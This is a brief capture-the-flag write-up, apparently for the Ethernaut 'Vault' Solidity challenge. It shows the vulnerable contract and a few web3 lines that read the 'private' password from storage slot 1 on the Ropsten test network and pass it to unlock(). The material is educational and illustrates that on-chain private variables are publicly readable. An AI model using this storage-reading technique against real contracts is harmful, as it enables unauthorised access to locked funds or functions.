# Vault
```javascript
pragma solidity ^0.4.18;
 
contract Vault {
  bool public locked;
  bytes32 private password;
 
  function Vault(bytes32 _password) public {
    locked = true;
    password = _password;
  }
 
  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

This challenge ask we to change `locked` into false, this might need to call `unlock()` with right password.

Although, password is declaired as private in this challenge, according to all data store on blockchain, we still can use web3 to ask target blockchain the storage. 

```javascript
web3Provider = new Web3.providers.HttpProvider('https://ropsten.infura.io/');
web3 = new Web3(web3Provider);
web3.toAscii(web3.eth.getStorageAt(contract.address,1))
contract.unlock('/*the password you get from ropsten testing network*/')
contract.locked()
```